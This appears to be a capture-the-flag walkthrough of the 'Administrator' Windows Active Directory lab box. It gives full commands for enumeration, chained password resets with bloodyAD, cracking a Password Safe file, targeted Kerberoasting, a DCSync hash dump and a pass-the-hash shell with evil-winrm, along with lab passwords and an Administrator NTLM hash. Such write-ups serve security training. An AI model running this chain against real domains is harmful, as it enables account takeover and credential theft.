# Administrator

```
Difficulty: Medium
Operating System: Windows
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
| :-- | :--- | :--- | :--- |
| 1 | `Olivia` | **Credentialed Enumeration** | Used provided credentials for `Olivia` to perform enumeration via `crackmapexec`, revealing a list of users in the domain. |
| 2 | `Michael`, `Benjamin` | **BloodHound & Password Reset** | Analyzed domain relationships with **BloodHound**, discovering that `Olivia` could reset `Michael`'s password, and `Michael` could reset `Benjamin`'s. Used `bloodyAD` to perform the chained password resets. |
| 3 | `Benjamin` | **File Transfer & Password Cracking** | Logged into the FTP service with `Benjamin`'s new password and downloaded an encrypted file, `Backup.psafe3`. Used **`pwsafe2john`** and **`john`** to crack the file's master password, revealing credentials for several users, including `Emily`. |
| 4 | `Emily`, `Ethan` | **Targeted Kerberoasting** | With `Emily`'s credentials, abused her write permissions on `Ethan`'s account to perform a **Targeted Kerberoasting** attack. This involved setting a temporary SPN and capturing the resulting service ticket hash. |
| 5 | `Ethan` | **Hash Cracking** | Used **`john`** to crack the captured Kerberos hash, recovering the password for the `Ethan` user. |
| 6 | `Administrator` | **DCSync Attack** | Used `Ethan`'s compromised credentials and the **DCSync** technique via `secretsdump.py` to dump all user password hashes from the domain controller, including the `Administrator`'s NTLM hash. |
| 7 | `Administrator` | **Hash-Based Login** | Used **`evil-winrm`** and the `Administrator`'s NTLM hash to log into the domain controller, gaining a high-privileged shell and access to the `root.txt` flag. |


To start, the initial access on the **Administrator** box is through the provided credentials for the `Olivia` account. The overall attack path involves a series of lateral movements and privilege escalation techniques to compromise the domain controller and gain full administrative control.

### Enumeration and Initial Access

Initial enumeration with `nmap` shows a typical Windows Active Directory setup with several key ports open.

  * `21/tcp`: FTP, potentially allowing file transfers.
  * `88/tcp`: Kerberos, used for authentication.
  * `139/tcp`, `445/tcp`: SMB, used for file and printer sharing.
  * `389/tcp`, `636/tcp`: LDAP, used to query the directory service.

With the provided credentials for the **Olivia** account (`ichliebedich`), you can begin to enumerate the domain.

```bash
# Check available SMB shares
crackmapexec smb administrator.htb -u "Olivia" -p "ichliebedich"

# Enumerate users via RID brute force
crackmapexec smb administrator.htb -u "Olivia" -p "ichliebedich" --rid-brute
```

The `rid-brute` command reveals a list of users, including `Michael` and `Benjamin`, who are central to the attack.

### Lateral Movement: Password Resets

The next step is to analyze the relationships between users to find an attack path. **BloodHound** is the ideal tool for this, as it maps out privilege relationships in an Active Directory environment.

```bash
# Run bloodhound-python to collect data
bloodhound-python -u Olivia -p 'ichliebedich' -c All -d administrator.htb -ns 10.10.11.42
```

After ingesting the data into the BloodHound GUI, you discover a chain of control: **Olivia** can force a password change for **Michael**, who can then force a password change for **Benjamin**.

1.  **Change Michael's password** using `bloodyAD`, a powerful Active Directory exploration and exploitation tool.
    ```bash
    bloodyAD -u "olivia" -p "ichliebedich" -d "Administrator.htb" --host "10.10.11.42" set password "Michael" "NewPassword123!"
    ```
2.  **Change Benjamin's password** using Michael's newly set credentials.
    ```bash
    bloodyAD -u "Michael" -p "NewPassword123!" -d "Administrator.htb" --host "10.10.11.42" set password "Benjamin" "AnotherNewPass234!"
    ```

\<hr\>

### Data Exfiltration and Cracking

With access to the **Benjamin** account, you can now log in to the FTP service.

```bash
# Log in to FTP
ftp administrator.htb
# User: Benjamin
# Password: AnotherNewPass234!
ls -la
```

You'll find a file named **`Backup.psafe3`**. This is an encrypted Password Safe file.

```bash
# Download the file
get Backup.psafe3

# Convert the .psafe3 file to a crackable hash format
pwsafe2john Backup.psafe3 > hash.txt

# Crack the hash using a wordlist
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

The password for the Password Safe file is revealed to be **`tekieromucho`**. Using the **Password Safe** application (which can be installed on Kali), you can open the file and find credentials for several users, including **Emily**.

**Emily's credentials:**

  * Username: `emily`
  * Password: `UXLCI5XXXXXXXXXXXXXXXXXXXXXXX`

\<hr\>

### Privilege Escalation: Targeted Kerberoasting

Returning to the BloodHound analysis, you'll see a specific privilege path from **Emily** to **Ethan**. Emily has permissions to write to Ethan's account attributes. This can be abused to perform a **targeted Kerberoasting** attack.

**Targeted Kerberoasting** involves temporarily setting a **Service Principal Name (SPN)** on a user account that doesn't have one. This allows you to request a Kerberos service ticket (TGS) for that user, which can then be cracked offline to reveal their password.

1.  **Run `targetedKerberoast.py`** from the Impacket framework.

    ```bash
    # Note: Ensure your system time is synchronized with the DC to avoid Kerberos errors
    ntpdate administrator.htb

    # Run the targeted Kerberoasting script
    python targetedKerberoast.py -u "emily" -p "UXLCI5XXXXXXXXXXXXXXXXXXXXXXX" -d "Administrator.htb" --dc-ip 10.10.11.42
    ```

    The script will output a crackable Kerberos hash for **Ethan**.

2.  **Crack the hash** with `john`.

    ```bash
    # Save the hash to a file, e.g., 'ethan_hash.txt'
    john ethan_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
    ```

    The password for **Ethan** is **`liXXXXXXX`**.

\<hr\>

### Final Compromise: DCSync Attack

Ethan's account has the privileges to perform a **DCSync** attack. This attack allows an attacker to simulate a domain controller and request a replication of the domain's user hashes, including the `Administrator` hash, bypassing the need to crack a password.

1.  **Use `secretsdump.py`** from the Impacket framework to perform the DCSync attack.

    ```bash
    impacket-secretsdump "Administrator.htb/ethan:liXXXXXXX"@"dc.Administrator.htb"
    ```

2.  The command's output will show all user hashes. Locate the NTLM hash for the **Administrator** account: `3dc553ce4b9fd20bd016e098d2d2fd2e`.

3.  **Use the hash to log in** via `evil-winrm`.

    ```bash
    evil-winrm -i administrator.htb -u administrator -H "3dc553ce4b9XXXXXXXXXXXXXXXX"
    ```

    You now have a high-privileged shell on the domain controller as the **Administrator**.